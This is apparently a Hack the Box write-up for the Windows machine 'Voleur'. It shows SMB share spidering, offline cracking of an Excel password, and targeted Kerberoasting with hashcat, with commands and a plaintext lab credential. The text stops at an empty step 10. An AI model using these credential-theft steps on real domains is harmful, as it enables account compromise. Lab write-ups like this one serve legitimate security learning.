# Voleur

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Medium**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Learn to abuse WriteOwner privilege using Impacket's owneredit.py script
- Give an account FullControl using Impacket's dacledit.py tool
- Enumerate and restore deleted user accounts on PowerShell
- Exploit ESC15 vulnerable template
- Add user to Domain Admin group with an LDAP shell


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan along with bloodhound

![image](https://github.com/user-attachments/assets/9374b63e-36de-4aa2-96d2-ef3957b8f57b)

2. Bloodhound doesn't give us a path from credentials given ryan.naylor. After enumerating using netexec smb, found an interesting IT share so download files with the spider_plus module

`nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k -M spider_plus -o DOWNLOAD_FLAG=True`

![image](https://github.com/user-attachments/assets/ac3f931f-437f-47de-a391-d6399fff89d4)

3. Trying to open the .xlsx file shows that it's password protected, so use the office2john script and crack password offline.

![image](https://github.com/user-attachments/assets/dd5ebfc5-ce1e-40e0-827c-8f31349acbd9)

4. Get rid of the filename in the beginning and crack using hashcat. We get the password!

`hashcat -m 9600 excel_hash.txt /usr/share/wordlists/rockyou.txt`

![image](https://github.com/user-attachments/assets/d164a5a2-e75c-4848-9d22-dabd4e0ef5fc)

5. Open the password protected excel file and we get a list of user credentials

![image](https://github.com/user-attachments/assets/c2658702-3661-4c3f-bf1a-0eb0b3792eb3)

6. Using svc_ldap's credentials, can do a targetedKerberoast attack on svc_winrm which has CanPSRemote rights to the machine.

![image](https://github.com/user-attachments/assets/fcef36ad-42ad-4e1b-ba51-1c44018acac6)

7. First, get TGT for svc_ldap using impacket's getTGT.py script and set KRB5CCNAME environment variable to use the ccache file.

`getTGT.py -k -dc-ip dc.voleur.htb voleur.htb/svc_ldap:'[PASSWORD]'`

![image](https://github.com/user-attachments/assets/7341c702-d2a8-43d7-91b4-736c41cfc8e0)

8. Now run targetedKerberoast.py with kerberos authentication

`targetedKerberoast.py -k --dc-ip 10.129.61.59 --dc-host dc.voleur.htb -v -d voleur.htb`

![image](https://github.com/user-attachments/assets/b86fc911-0c80-4d28-9d3e-08694c182c9a)

9. Crack hash offline using hashcat

`hashcat -m 13100 targetedKerberoast.txt /usr/share/wordlists/rockyou.txt`

10. 
